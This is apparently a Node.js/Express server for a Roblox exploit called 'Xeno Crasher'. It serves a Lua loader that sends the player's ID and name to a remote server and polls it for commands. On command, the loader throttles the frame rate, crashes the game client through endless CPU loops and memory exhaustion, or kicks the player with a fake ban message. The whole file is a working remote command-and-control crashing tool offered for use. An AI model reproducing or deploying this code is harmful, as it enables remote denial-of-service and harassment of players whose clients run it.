const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT
// ============================================
app.get('/loader.lua', (req, res) => {
    // Serve the script above (or use the one from your site)
    const loader = `--[[ Xeno Crasher - UNIVERSAL ]]--
local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

local HttpService = game:GetService("HttpService")
HttpService.HttpEnabled = true

local function sendGet(url)
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = url,
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Api-Key"] = KEY
            }
        })
    end)
    if success and result and result.Body then
        return result.Body
    else
        return nil
    end
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenoCrasherGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LP:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 60)
    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.4
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 30)
    label.Text = "✅ Xeno Crasher"
    label.TextColor3 = Color3.fromRGB(100, 255, 100)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 14
    label.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 20)
    status.Position = UDim2.new(0, 0, 0, 30)
    status.Text = "🟢 Connecting..."
    status.TextColor3 = Color3.fromRGB(150, 150, 150)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.SourceSans
    status.TextSize = 11
    status.Parent = frame
    
    return screenGui, status
end

local gui, statusLabel = createGUI()

local function heartbeat()
    local url = BASE .. "/api/public/heartbeat?user_id=" .. LP.UserId 
        .. "&username=" .. HttpService:UrlEncode(LP.Name)
        .. "&display_name=" .. HttpService:UrlEncode(LP.DisplayName)
        .. "&executor=XenoClient&online=true"
    
    local result = sendGet(url)
    if result then
        statusLabel.Text = "🟢 Connected"
    else
        statusLabel.Text = "⚠️ No connection"
    end
end

local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    if not targetFPS or targetFPS <= 0 then
        statusLabel.Text = "🟢 FPS off"
        return
    end
    fpsActive = true
    local frameTime = 1 / targetFPS
    statusLabel.Text = "🎯 FPS: " .. targetFPS
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do end
    end)
end

local pollRunning = false
local function poll()
    if pollRunning then return end
    pollRunning = true
    local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
    local result = sendGet(url)
    if result and result ~= "" then
        local data = HttpService:JSONDecode(result)
        print("📥 Received: " .. HttpService:JSONEncode(data))
        if data.fps_limit then
            setFPSLimit(tonumber(data.fps_limit))
        else
            setFPSLimit(nil)
        end
        if data.crash == true then
            print("💥 CRASH!")
            statusLabel.Text = "💥 CRASHING!"
            task.spawn(function()
                while true do
                    local x = 0
                    for i = 1, 1000000 do x = x + i end
                end
            end)
            task.spawn(function()
                local t = {}
                while true do
                    for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
                    task.wait()
                end
            end)
        end
        if data.kick == true then
            print("👢 KICK!")
            task.wait(0.5)
            LP:Kick("You have been banned.")
        end
    end
    pollRunning = false
end

print("🚀 Starting Xeno Crasher...")
heartbeat()
task.wait(3)
task.spawn(function()
    while true do
        poll()
        task.wait(0.5)
    end
end)
task.spawn(function()
    while true do
        heartbeat()
        task.wait(5)
    end
end)
print("✅ Xeno Crasher loaded!")
print("👤 Player: " .. LP.Name)`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// ✅ NEW: GET endpoint for heartbeat
// ============================================
app.get('/api/public/heartbeat', (req, res) => {
    const { user_id, username, display_name, executor, online } = req.query;
    if (!user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(user_id);
    
    const existing = players.get(userId) || {};
    const data = {
        user_id: userId,
        username: username || existing.username || 'Unknown',
        display_name: display_name || existing.display_name || '',
        executor: executor || existing.executor || 'Unknown',
        online: online === 'true'
    };
    
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        fps_limit: false
    });
    
    console.log(`❤️ Heartbeat (GET) from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        fps_limit: false
    });
    
    console.log(`❤️ Heartbeat (POST) from: ${data.username || userId}`);
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({});
    
    const response = {};
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
